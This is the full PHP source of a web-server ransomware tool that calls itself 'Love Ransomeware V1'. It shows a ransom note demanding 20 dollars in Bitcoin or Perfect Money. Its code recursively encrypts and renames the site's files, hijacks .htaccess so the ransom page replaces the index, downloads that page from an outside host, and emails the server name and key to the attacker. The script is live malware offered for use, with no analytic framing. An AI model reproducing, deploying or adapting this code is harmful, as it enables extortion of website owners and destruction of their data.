<?php
error_reporting(0);
set_time_limit(0);
ini_set('memory_limit', '-1');
 
Class lversm_rsw{
    public $msg = "https://pastescript.000webhostapp.com/love.php"; #
    public $report_to = "love.ransomeware@gmail.com"; #
    public function __construct()
    {?>     <!DOCTYPE html>
        <html>
        <head>
            <title>Love Ransomeware V1</title>
            <meta charset="utf-8">
            <meta name="author" content="LoveRansome">
            <meta name="description" content="Love Ransomeware">
            <style type="text/css">html,body{background: #000;color: #eee;text-align: center;}input,select{color: #eee;background: #000;padding: 6px;border:1px solid #f00;}a{color:#f00;text-decoration:none}a:hover{text-decoration: underline;color: #eee}</style>
        </head>
        <body><br/><br/><br/><br/><br/><br/>
            <fieldset style="max-width: 800px;margin: 0 auto;box-shadow: 0px 0px 20px #f00"><legend>Love Ransomeware V.1</legend>
<pre>
'||                          '||'''|,                                                 
 ||                           ||   ||                                                 
 ||     .|''|, \\  // .|''|,  ||...|'  '''|.  `||''|,  ('''' .|''|, '||),,(|,  .|''|, 
 ||     ||  ||  \\//  ||..||  || \\   .|''||   ||  ||   `'') ||  ||  || || ||  ||..|| 
.||...| `|..|'   \/   `|...  .||  \\. `|..||. .||  ||. `...' `|..|' .||    ||. `|...  
                                                                                      
                                                                                      

[ Perfect Money - U21100775 ]
[ Bitcoin Wallet - 37i4zw24JA9ntejkP3PFaNnGBgmfp3EkQn ]
 
 
 Oops!
 
 It seems you are exposed to love from Me...
 
 I Don't Want To Lose You Again ..
 
 Therefore I Lock All Your Files, I Will Release You From Me After You Redeem It. It's cheap, only 20 $. Payment Via Perfect Money Or Bitcoin Yes..
 (DO NOT ENTER PASSWORD ORIGIN - ORIGIN IF YOUR FILE DO NOT WANT TO MISS !!!!!!)
 (I Will Give You a Password to Decrypt / Reopen Your File. If You Pay 20$)
 
 Quiet! Your Files Are Not Erased!
 
 Contact Me Yes For More Information..
 
 Email : love.ransomeware@gmail.com
 </pre>
<?php
        if(empty($_POST['opt']) && empty($_POST['key'])){
        ?>
 
        <form method="post">
            <label>PASSWORD :</label>
            <input type="text" name="key" placeholder="Enter Password.." style="width: 250px" required="">
            <select name="opt">
                <option>-MENU-</option>
                <option value="e">EnCRYPT</option>
                <option value="d">DeCRYPT</option>
            </select>
        <input type="submit" value="Execute ~>">
        </form>
        <?php
    }else{
        echo "[ <a href='?'>Back </a>] <br>";
        $opt = $_POST['opt'];
        $key = $_POST['key'];
switch ($opt) {
   case 'e':
      $this->loveransomeware($this->locate(),'e',$key);
   break;
   case 'd':
     $this->loveransomeware($this->locate(),'d',$key);
   break;
}
    }
    ?>  </fieldset>
        </body>
        </html><?php
    }
    public function Loveinit()
    {
        if(!file_exists('.htloversm'))
        {if(file_exists('.htaccess')){
            rename('.htaccess','.htloversm');
        }else{
            touch('.htaccess');
            rename('.htaccess','.htloversm');
        }
            $fp = fopen('.htaccess','w');
            $htc ="# LveRansome ! [ encrypted at ".date('D , d M Y H:i:s')." ]\r\nDirectoryIndex love-ransome.php\r\nErrorDocument 404 /love-ransome.php";
            fwrite($fp,$htc);
            echo ".... Manipulating <i><b>.htaccess</b></i> DONE .... <br>";
        }
        if(preg_match("/^http/",$this->msg))
        {
            $msg = file_get_contents($this->msg);
        }else{
            $msg = base64_decode($this->msg);
        }
        if(file_put_contents('love-ransome.php',$msg))
        {
            echo ".... Manipulating <i><b>Index & Change display of page</b></i>  DONE .... <br>";
        }
    }
    public function Loveunit()
    {
        if(file_exists('.htloversm'))
        {
            if(unlink('.htaccess') && unlink('love-ransome.php'))
            {
                echo ".... Restore <i><b>.htaccess</b></i> DONE .... <br>";
                echo ".... Restore <i><b>Index files</b></i> DONE ....<br>";
            }
            rename('.htloversm','.htaccess');
        }
    }
    public function lversmended($npy,$method){
      switch ($method) {
        case 'e':
          rename($npy, $npy.".lversm");
        break;
        case 'd':
          $npys = str_replace(".lversm", "", $npy);
          rename($npy, $npys);
        break;
      }
   }
      public function enkontol($key,$pwd){
      $data = file_get_contents($pwd);
      $iv = mcrypt_create_iv(mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC),MCRYPT_DEV_URANDOM);
      $encrypted = base64_encode($iv.mcrypt_encrypt(MCRYPT_RIJNDAEL_128,hash('sha256',$key,true),$data,MCRYPT_MODE_CBC,$iv));
      if(file_put_contents($pwd,$encrypted )){
         echo "[<font color=lime>LOCKED</font>][".date('d:m:Y')."] => ".$pwd." <br>";
      }else{
         echo "[<font color=red>FAILED</font>][".date('d:m:Y')."] => ".$pwd." <br>";
      }
   }
   public function dekontol($key,$pwd){
      $data = base64_decode( file_get_contents($pwd) );
      $iv = substr($data, 0, mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC));
      $decrypted = rtrim(mcrypt_decrypt(MCRYPT_RIJNDAEL_128,hash('sha256', $key, true),substr($data, mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC)),MCRYPT_MODE_CBC,$iv),"\0");
      if(file_put_contents($pwd,  $decrypted )){
        echo "[<font color=lime>UNLOCKED</font>][".date('d:m:Y')."] => ".$pwd." <br>";
      }else{
        echo "[<font color=red>--FAILED</font>][".date('d:m:Y')."] => ".$pwd." <br>";
      }
   }
   public function kecuali($ext,$name){
        $re = "/({$name})/";
        preg_match($re, $ext, $matches);
        if($matches[1]){
            return false;
        }
            return true;
     }
   public function loveransomeware($dir,$method,$key)
   { switch ($method) {
          case 'e':
            $this->Loveinit();
          break;
          case 'd':
           $this->Loveunit();
          break;
        }
        $s = scandir($dir);
        foreach($s as $d)
        {
            if($d!='.' && $d!='..')
            {
                $locate = $dir.DIRECTORY_SEPARATOR.$d;
                if(!is_dir($locate)){
                   if($this->kecuali($locate,"love.php")&&
                    $this->kecuali($locate,".png")  &&
                    $this->kecuali($locate,".htaccess")  &&
                    $this->kecuali($locate,"love-ransome.php") &&
                     $this->kecuali($locate,"index.php") &&
                     $this->kecuali($locate,".htloversm") ){
                     switch ($method) {
                        case 'e':
                           $this->enkontol($key,$locate);
                           $this->lversmended($locate,'e');
                        break;
                        case 'd':
                           $this->dekontol($key,$locate);
                           $this->lversmended($locate,'d');
                        break;
                     }
                   }
                }else{
                  $this->loveransomeware($locate,$method,$key);
                }
            }
            $this->plus();
        }
        $this->report($key);
    }
       public function report($key){
        $message.= "=========     Report Ransomware    =========\n";
        $message.= "Server    : ".$_SERVER['HTTP_HOST']."\n";
        $message.= "Key       : ".$key."\n";
        $message.= "Encrypted : ".date('D , d M Y H:i:s')."\n";
        $message.= "========= Love-Ransomware =========\n";
        $subject = "[LOVE-RANSOMWARE][".$_SERVER['HTTP_HOST']."]";
        $headers = "From: Ardyma <love.ransomewar@gmail.com>\r\n";
        mail($this->report_to,$subject,$message,$headers);
   }
     public function plus(){
      flush();
      ob_flush();
   }
   public function locate(){
        return getcwd();
    }
}
 
new lversm_rsw();
 ?>